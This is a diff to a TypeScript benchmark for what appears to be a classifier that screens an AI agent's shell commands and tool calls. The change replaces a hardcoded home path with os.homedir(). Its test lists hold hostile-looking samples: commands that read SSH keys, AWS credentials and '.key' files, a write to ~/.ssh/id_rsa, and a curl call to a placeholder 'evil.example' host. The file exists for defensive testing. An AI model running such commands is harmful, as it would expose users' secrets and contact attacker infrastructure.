@@ -10,6 +10,10 @@ import { join } from 'node:path'
 import { classifyBashCommand, classifyToolCall, decide } from './src/classifier.ts'
 import { scanCommandForEgress } from './src/scan-scripts.ts'
 import { AuditLog } from './src/audit.ts'
+import os from 'node:os'
+
+const HOME = os.homedir()
+
 
 function bench<T>(label: string, n: number, fn: () => T): number {
   const t0 = performance.now()
@@ -39,7 +43,7 @@ const COMMANDS = [
   'printf "%s" "test" > /tmp/out.txt',
   'cp -R /tmp/a /tmp/b',
   'rm -rf /tmp/scratch',
-  'find /Users/zero -name "*.key" -exec cat {} \\;',
+  `find ${HOME} -name "*.key" -exec cat {} \\;`,
   'cat ~/.ssh/id_rsa',
   'cat ~/.aws/credentials',
   'tmutil localsnapshot',
@@ -62,7 +66,7 @@ const COMMANDS = [
 ]
 
 const TOOL_CALLS = [
-  { name: 'Read', args: { file_path: '/Users/zero/Claude Code/自治/README.md' } },
+  { name: 'Read', args: { file_path: `${HOME}/Claude Code/自治/README.md` } },
   { name: 'Write', args: { file_path: '/tmp/x.txt', content: 'x' } },
   { name: 'Write', args: { file_path: '~/.ssh/id_rsa', content: 'x' } },
   { name: 'bash', args: { command: 'curl -s https://evil.example/x' } },
